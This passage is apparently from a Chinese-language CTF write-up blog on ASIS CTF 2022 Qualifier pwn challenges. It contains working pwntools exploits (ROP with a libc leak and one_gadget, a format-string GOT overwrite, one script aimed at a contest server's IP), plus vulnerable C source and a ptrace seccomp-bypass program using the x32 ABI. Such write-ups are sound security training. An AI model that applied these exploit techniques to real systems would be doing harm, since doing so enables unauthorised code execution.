class="hljs-built_in">str</span>(idx).encode())<br>    ru(<span class="hljs-string">b&#x27;-&gt; &#x27;</span>)<br>    data = p.recvline(<span class="hljs-literal">False</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;[undefined]&#x27;</span> <span class="hljs-keyword">in</span> data:<br>        log.error(<span class="hljs-string">&#x27;get idx:&#123;idx&#125; [undefined]&#x27;</span>)<br>    data = u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    <span class="hljs-keyword">return</span> data<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">set</span>(<span class="hljs-params">idx:<span class="hljs-built_in">int</span>, data:<span class="hljs-built_in">bytes</span>=<span class="hljs-string">b&#x27;\x00&#x27;</span></span>):</span><br>    sla(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;idx =&#x27;</span>, <span class="hljs-built_in">str</span>(idx).encode())<br>    sa(<span class="hljs-string">b&#x27;data = &#x27;</span>, data[:-<span class="hljs-number">1</span>] <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data)==<span class="hljs-number">0x20</span> <span class="hljs-keyword">else</span> data+<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>    rl()<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">initial</span>():</span><br>    sl(<span class="hljs-string">b&#x27;Yogdzewa&#x27;</span>)<br>    sl(<span class="hljs-built_in">str</span>(<span class="hljs-number">0x40000004</span>))<br><br><br>initial()<br><span class="hljs-built_in">set</span>(<span class="hljs-number">5</span>, p64(<span class="hljs-number">0</span>)+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x18</span>)<br>chunk1_addr = get(<span class="hljs-number">5</span>)<br>log.success(<span class="hljs-string">f&#x27;data is: 0x<span class="hljs-subst">&#123;chunk1_addr:x&#125;</span>&#x27;</span>)<br><br><span class="hljs-built_in">set</span>(<span class="hljs-number">5</span>, flat([<span class="hljs-number">0</span>, <span class="hljs-number">0x421</span>]))<br><span class="hljs-built_in">set</span>(<span class="hljs-number">7</span>, flat([chunk1_addr+<span class="hljs-number">0x40</span>, chunk1_addr+<span class="hljs-number">0x40</span>], <span class="hljs-number">0</span>, <span class="hljs-number">0</span>))<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        log.success(<span class="hljs-string">f&#x27;idx is: <span class="hljs-subst">&#123;<span class="hljs-number">17</span>+j+i*<span class="hljs-number">6</span>&#125;</span>&#x27;</span>)<br>        <span class="hljs-built_in">set</span>(<span class="hljs-number">17</span>+j+i*<span class="hljs-number">6</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><span class="hljs-built_in">set</span>(<span class="hljs-number">0</span>)<br><span class="hljs-comment">#the nextchunk header set</span><br><span class="hljs-built_in">set</span>(<span class="hljs-number">1</span>, flat([<span class="hljs-number">0</span>, <span class="hljs-number">0x31</span>]))<br><br>gdb.attach(p)<br><span class="hljs-comment">#this will malloc a chunk first, so that puts a chunk between</span><br><span class="hljs-comment">#top chunk and freed one. Will not get into **consolidate forward**</span><br><span class="hljs-built_in">set</span>(<span class="hljs-number">5</span>, flat([<span class="hljs-number">0</span>, <span class="hljs-number">0x31</span>]))<br>fd_ptr = get(<span class="hljs-number">6</span>)<br>log.success(<span class="hljs-string">f&#x27;fd_ptr is: 0x<span class="hljs-subst">&#123;fd_ptr:x&#125;</span>&#x27;</span>)<br>libc.address = fd_ptr - <span class="hljs-number">0x1ebbe0</span><br>log.success(<span class="hljs-string">f&#x27;libc_base is: 0x<span class="hljs-subst">&#123;libc.address:x&#125;</span>&#x27;</span>)<br><br><span class="hljs-comment"># work-in-progress</span><br><br><br><br><br><br>itt()<br></code></pre></div></td></tr></table></figure>

<h1 id="ASIS-CTF-2022-QUAL"><a href="#ASIS-CTF-2022-QUAL" class="headerlink" title="ASIS CTF 2022 QUAL"></a>ASIS CTF 2022 QUAL</h1><h2 id="babyscan-1"><a href="#babyscan-1" class="headerlink" title="babyscan-1"></a>babyscan-1</h2><p>非预期解, 因为<code>%0s</code>相当于不限制长度. 而且amlloc不改变rsp, 就是直接对栈进行覆盖. 来自r3kapig. </p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.terminal = [<span class="hljs-string">&#x27;gnome-terminal&#x27;</span>, <span class="hljs-string">&#x27;-x&#x27;</span>, <span class="hljs-string">&#x27;sh&#x27;</span>, <span class="hljs-string">&#x27;-c&#x27;</span>]<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>r = process(<span class="hljs-string">&#x27;/mnt/hgfs/ubuntu/ASIS/babyscan/bin/chall&#x27;</span>)<br>r = remote(<span class="hljs-string">&#x27;65.21.255.31&#x27;</span>,<span class="hljs-number">13370</span>)<br>elf = ELF(<span class="hljs-string">&#x27;/mnt/hgfs/ubuntu/ASIS/babyscan/bin/chall&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;/mnt/hgfs/ubuntu/ASIS/babyscan/lib/libc.so.6&#x27;</span>)<br><br><span class="hljs-comment"># gdb.attach(r)</span><br>r.recvuntil(<span class="hljs-string">b&quot;size: &quot;</span>)<br>r.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0</span>))<br><br>r.recvuntil(<span class="hljs-string">&quot;data: &quot;</span>)<br>pop_rdi = <span class="hljs-number">0x0000000000401433</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span>+p64(pop_rdi)+p64(elf.got[<span class="hljs-string">&quot;alarm&quot;</span>])+p64(elf.plt[<span class="hljs-string">&quot;puts&quot;</span>])+p64(<span class="hljs-number">0x401130</span>) <span class="hljs-comment"># _start</span><br>r.sendline(payload)<br>libc_base = u64(r.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\0&#x27;</span>))-libc.sym[<span class="hljs-string">&quot;alarm&quot;</span>]<br>r.recvuntil(<span class="hljs-string">b&quot;size: &quot;</span>)<br>r.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0</span>))<br>r.recvuntil(<span class="hljs-string">&quot;data: &quot;</span>)<br>ogg = libc_base+<span class="hljs-number">0xe3b01</span>    <span class="hljs-comment"># getted by one_gadget</span><br>r.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span>+p64(ogg))<br><br><br>r.interactive()<br></code></pre></div></td></tr></table></figure>

<h2 id="babyscan-2"><a href="#babyscan-2" class="headerlink" title="babyscan-2"></a>babyscan-2</h2><p>src: </p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;ctype.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-keyword">char</span> size[<span class="hljs-number">16</span>], fmt[<span class="hljs-number">8</span>], *buf;<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;size: &quot;</span>);<br>  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%15s&quot;</span>, size);<br>  <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">isdigit</span>(*size))<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[-] Invalid number&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>  &#125;<br><br>  buf = (<span class="hljs-keyword">char</span>*)<span class="hljs-built_in">malloc</span>(atoi(size) + <span class="hljs-number">1</span>);<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;data: &quot;</span>);<br>  <span class="hljs-built_in">snprintf</span>(fmt, <span class="hljs-keyword">sizeof</span>(fmt), <span class="hljs-string">&quot;%%%ss&quot;</span>, size); <span class="hljs-comment">//vuln is here</span><br>  <span class="hljs-built_in">scanf</span>(fmt, buf);<br><br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br>__attribute__((constructor))<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">setup</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>&#123;<br>  setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);<br>  setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br>  setbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-literal">NULL</span>);<br>  alarm(<span class="hljs-number">180</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>exp: 来自r3kapig-Lotus</p>
<figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.terminal = [<span class="hljs-string">&#x27;gnome-terminal&#x27;</span>, <span class="hljs-string">&#x27;-x&#x27;</span>, <span class="hljs-string">&#x27;sh&#x27;</span>, <span class="hljs-string">&#x27;-c&#x27;</span>]<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>r = process(<span class="hljs-string">&#x27;/mnt/hgfs/ubuntu/ASIS/babyscan2/bin/chall&#x27;</span>)<br><span class="hljs-comment">#r = remote(&#x27;65.21.255.31&#x27;,33710)</span><br>elf = ELF(<span class="hljs-string">&#x27;/mnt/hgfs/ubuntu/ASIS/babyscan2/bin/chall&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;/mnt/hgfs/ubuntu/ASIS/babyscan2/lib/libc.so.6&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Lotus_write</span>(<span class="hljs-params">addr,content</span>):</span><br>    r.recvuntil(<span class="hljs-string">b&quot;size: &quot;</span>)<br>    r.send(<span class="hljs-string">b&#x27;9$\x00\x00\x00\x00\x00\x00&#x27;</span>+p64(addr)[:<span class="hljs-number">7</span>])<br>    r.recvuntil(<span class="hljs-string">&quot;data: &quot;</span>)<br>    r.sendline(content)<br><br><span class="hljs-comment"># gdb.attach(r,&#x27;b *0x40132b&#x27;)</span><br><span class="hljs-comment"># gdb.attach(r,&#x27;b *0x401286&#x27;)</span><br><span class="hljs-comment"># Lotus_write(elf.got[&quot;atoi&quot;],p64(elf.plt[&quot;printf&quot;])+p64(0x401140)+p64(0x401256)[:7])</span><br>Lotus_write(elf.got[<span class="hljs-string">&quot;exit&quot;</span>],p64(<span class="hljs-number">0x401256</span>)[:<span class="hljs-number">7</span>])<br><span class="hljs-comment"># gdb.attach(r,&#x27;b *0x40128B&#x27;)</span><br><span class="hljs-comment"># r.recvuntil(b&quot;size: &quot;)</span><br><span class="hljs-comment"># r.sendline(b&#x27;%p&#x27;)</span><br><br><span class="hljs-comment"># print(hex(elf.plt[&quot;atoi&quot;]))</span><br>Lotus_write(elf.got[<span class="hljs-string">&quot;atoi&quot;</span>],p64(elf.plt[<span class="hljs-string">&quot;printf&quot;</span>])[:<span class="hljs-number">7</span>])<br><span class="hljs-comment"># gdb.attach(r,&#x27;b *0x4012CD&#x27;)</span><br><br>r.recvuntil(<span class="hljs-string">b&quot;size: &quot;</span>)<br>r.sendline(<span class="hljs-string">b&#x27;1-%9$p+&#x27;</span>)<br>r.recvuntil(<span class="hljs-string">b&#x27;-&#x27;</span>)<br>libc_base = <span class="hljs-built_in">int</span>(r.recvuntil(<span class="hljs-string">b&#x27;+&#x27;</span>)[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)-<span class="hljs-number">0x9A154</span><br>r.recvuntil(<span class="hljs-string">b&quot;data: &quot;</span>)<br>r.sendline(<span class="hljs-string">b&#x27;a&#x27;</span>)<br>ogg = libc_base+<span class="hljs-number">0xe3b01</span><br>Lotus_write(elf.got[<span class="hljs-string">&quot;printf&quot;</span>],p64(ogg)[:<span class="hljs-number">7</span>])<br><span class="hljs-comment"># gdb.attach(r)</span><br><span class="hljs-comment"># r.recvuntil(b&quot;size: &quot;)</span><br><span class="hljs-comment"># r.sendline(b&#x27;15&#x27;)</span><br><br>log.success(<span class="hljs-string">&quot;libc_base: &quot;</span>+<span class="hljs-built_in">hex</span>(libc_base))<br>r.interactive()<br></code></pre></div></td></tr></table></figure>

<h2 id="readable"><a href="#readable" class="headerlink" title="readable"></a>readable</h2><p>终于发现了这题目环境的用法, 先是build.sh编译一下然后再docker build, 然后deploy.py中有一句socat命令是在本地开一个端口接收exp文件, 保存为tempfile, 然后映射到docker中的<code>/tmp/exploit</code>, 继续启动docker, 完成权限设置之后执行/home/pwn/run. run设置了seccomp之后execve了exploit, 然后再怎么执行readme就是我们的事了. </p>
<h3 id="solution-1"><a href="#solution-1" class="headerlink" title="solution 1"></a>solution 1</h3><p>X32 ABI直接ptrace拿mmap的pie基址劫持write直接leak, 直接利用mmap系统调用时的地址信息打印出前0x2000的东西, 这样直接就可以发现flag. </p>
<p>这个编译起来不得使用32位? 试下. 还是得64位. </p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ptrace.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/wait.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/personality.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/user.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span> base = <span class="hljs-number">0</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">user_regs_struct</span> *<span class="hljs-title">regs</span> =</span> <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;   <br>    <span class="hljs-comment">// X32 ABI 对指针要求 32 位</span><br>    regs = mmap((<span class="hljs-keyword">void</span> *)<span class="hljs-number">0x233000</span>,<span class="hljs-number">0x1000</span>,PROT_READ|PROT_WRITE|PROT_EXEC,MAP_PRIVATE|MAP_ANONYMOUS,<span class="hljs-number">-1</span>,<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">pid_t</span> traced_process;<br>    <span class="hljs-keyword">long</span> ins;<br>    <span class="hljs-keyword">char</span> *argvs[] = &#123;<span class="hljs-string">&quot;/home/pipe/readme&quot;</span>,<span class="hljs-literal">NULL</span>&#125;;<br>    <span class="hljs-keyword">int</span> pid = fork();<br>    <span class="hljs-keyword">if</span> (pid == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">// ptrace(PTRACE_TRACEME, 0, 0, 0);</span><br>        syscall(<span class="hljs-number">0x40000209</span>,PTRACE_TRACEME, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>        execve(<span class="hljs-string">&quot;/home/pipe/readme&quot;</span>, argvs, <span class="hljs-literal">NULL</span>);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;exec failed&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    wait(<span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">int</span> blocked = <span class="hljs-number">0</span>;<br>        <span class="hljs-comment">// Wait until the child makes a syscall</span><br>        <span class="hljs-comment">// ptrace(PTRACE_SYSCALL, pid, 0, 0);</span><br>        syscall(<span class="hljs-number">0x40000209</span>,PTRACE_SYSCALL, pid, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><br>        waitpid(pid, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><br>        <span class="hljs-comment">// ptrace(PTRACE_GETREGS, pid, 0, &amp;regs);</span><br>        syscall(<span class="hljs-number">0x40000209</span>,PTRACE_GETREGS, pid, <span class="hljs-number">0</span>, regs);<br>        <span class="hljs-comment">// 获取程序基址，用 strace 在本地观察得到特征</span><br>        <span class="hljs-keyword">if</span>(regs-&gt;orig_rax == <span class="hljs-number">10</span> &amp;&amp; regs-&gt;rsi==<span class="hljs-number">0x1000</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Mmap Rdi:%08llx\nMmap Rsi:%08llx\nMmap Rdx:%08llx\n&quot;</span>,regs-&gt;rdi,regs-&gt;rsi,regs-&gt;rdx);<br>            base = regs-&gt;rdi;<br>        &#125;<br>        <span class="hljs-comment">// 随便劫持一个 Write 的系统调用，rsi 劫持到基址，rdx 大小大一点</span><br>        <span class="hljs-keyword">if</span> (regs-&gt;orig_rax == <span class="hljs-number">1</span> &amp;&amp; regs-&gt;rdx == <span class="hljs-number">0x10</span>) &#123;<br>            blocked = <span class="hljs-number">1</span>;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Rsi before:%08llx\n&quot;</span>,regs-&gt;rsi);<br>            regs-&gt;rdx = <span class="hljs-number">0x2000</span>;<br>            regs-&gt;rsi = base;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Rsi after:%08llx\n&quot;</span>,regs-&gt;rsi);<br>            <span class="hljs-comment">// ptrace(PTRACE_SETREGS, pid, 0, regs);</span><br>            syscall(<span class="hljs-number">0x40000209</span>,PTRACE_SETREGS, pid, <span class="hljs-number">0</span>, regs);<br>        &#125;<br>        <span class="hljs-comment">// Continue on with the now blocked syscall</span><br>        <span class="hljs-comment">// ptrace(PTRACE_SYSCALL, pid, 0, 0);</span><br>        syscall(<span class="hljs-number">0x40000209</span>,PTRACE_SYSCALL, pid, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><br>        waitpid(pid, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-comment">// If the program checks return value of the write, we need to make sure that the return value isn&#x27;t `-ENOSYS`</span><br>        <span class="hljs-comment">// if (blocked) &#123;regs-&gt;rax = 1; ptrace(PTRACE_SETREGS, pid, 0, regs); &#125;</span><br>        <span class="hljs-keyword">if</span> (blocked) &#123;regs-&gt;rax = <span class="hljs-number">1</span>; syscall(<span class="hljs-number">0x40000209</span>,PTRACE_SETREGS, pid, <span class="hljs-number">0</span>, regs); <span class="hljs-keyword">break</span>;&#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure>

<p>真正的系统调用号保存在 /usr/include/x86_64-linux-gnu/asm/unistd_x32.h：</p>
<figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> _ASM_X86_UNISTD_X32_H</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> _ASM_X86_UNISTD_X32_H 1</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __NR_read (__X32_SYSCALL_BIT + 0)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __NR_write (__X32_SYSCALL_BIT + 1)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __NR_open (__X32_SYSCALL_BIT + 2)</span><br>...<br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __NR_ioctl (__X32_SYSCALL_BIT + 514)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __NR_readv (__X32_SYSCALL_BIT + 515)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __NR_writev (__X32_SYSCALL_BIT + 516)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __NR_recvfrom (__X32_SYSCALL_BIT + 517)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __NR_sendmsg (__X32_SYSCALL_BIT + 518)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __NR_recvmsg (__X32_SYSCALL_BIT + 519)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __NR_execve (__X32_SYSCALL_BIT + 520)</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __NR_ptrace (__X32_SYSCALL_BIT + 521)</span><br>...<br></code></pre></div></td></tr></table></figure>

<ul>
<li><p>而<code>__X32_SYSCALL_BIT</code>的值为<code>0x40000000</code>, 所以上面的数值上就可以解释了. </p>
</li>
<li><p>int 0x80 和 syscall 的<a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/46087730#answer-46087731">区别</a> (好吧跟这个没啥关系. </p>
</li>
<li><p>主要利用点在于x64下有一种x32 ABI模式, 能够在减小指针和地址空间开销的同时利用起64位cpu上多的寄存器和运算部件, 提高程序运行速度. 他的系统调用就如上面所示, 只要加上一个数值即可, 或者说是按位或(|). 而寄存器高32位的部分都被清空, 以此模拟32位运行状态. </p>
</li>
</ul>
<p>还没有run过, 第二天环境弄一个小时没整好, 看来还是得靠docker. 终于知道了这一堆东西怎么用了. </p>
<p>不过为什么没法直接跑通? 看着挺好的呀, 但是看起来ptrace全都失败了, regs里面没有一点信息. </p>
<p>我还不知道在docker里面运行的程序如何调试. </p>
<p>ptrace真的fail了, 返回了一个-1. 继续查查errno看是什么. 是not implement. 不知道了. 只能一问队友. </p>
<p>crazyman说ubuntu18能行, 但是docker里面改成18.04并不可行. emmmmm?难道不是这样么?</p>
<p>22/11/14<strong>在编译linux时发现有一个选项是x32 ABI for 64 bit mode</strong>, 勾上了重新编译, 尝试了下能不能运行. </p>
<p>修改HOME路径, 再把readme重新编译成静态文件, 放到HOME中设置成其他用户只读, 忽略run.c(因为他只是限制了一下可用的系统调用)</p>
<p>还是遇到了很多问题. </p>
<ul>
<li>使用busybox的linux还是有很多限制, 每个文件都得编译成静态文件, 使得本来是PIE的readme变成静态链接文件, 然后mmap调用似乎消失了, ptrace根本截取不到(???), 也没有strace看到底发生了什么. </li>
<li>而且静态链接也使得文件变得很大, 仅输出前面0x2000字节还是不够, 还得调整. </li>
</ul>
<p>不过好在发现了这个方法<strong>确实可行</strong>, 不过docker里面的系统似乎都没有加上这一个选项, 想来当时比赛时的环境可以吧. 不过明明都是同一个Dockerfile怎么还不一样呢. </p>
<h3 id="solution-2-intended-one"><a href="#solution-2-intended-one" class="headerlink" title="solution 2 - intended one"></a>solution 2 - intended one</h3><blockquote>
<p>given by the author</p>
</blockquote>
<h4 id="作者原话"><a href="#作者原话" class="headerlink" title="作者原话:"></a>作者原话:</h4><ul>
<li>Intended way was using seccomp unotify to change libc binary</li>
<li>Linker loads libc, you set a hook for openat. And then use seccomp_setfd to send a poisoned libc</li>
</ul>
<p>seccomp unotify: user notify, 可以做到在syscall的时候携带信息给supervisor(大多都是container应用), 让它来决定是继续执行syscall还是停止执行并返回特定数值. </p>
<h4 id="流程"><a href="#流程" class="headerlink" title="流程:"></a>流程:</h4><ul>
<li>solve.py上传了exploit, 然后exploit在docker里接受payload放到<code>/tmp/payload</code>. </li>
<li>exp使用UNIX domain socket建立程序间通信渠道. </li>
<li>装载sigchild signal的处理函数, handler直接执行<code>exit()</code>. </li>
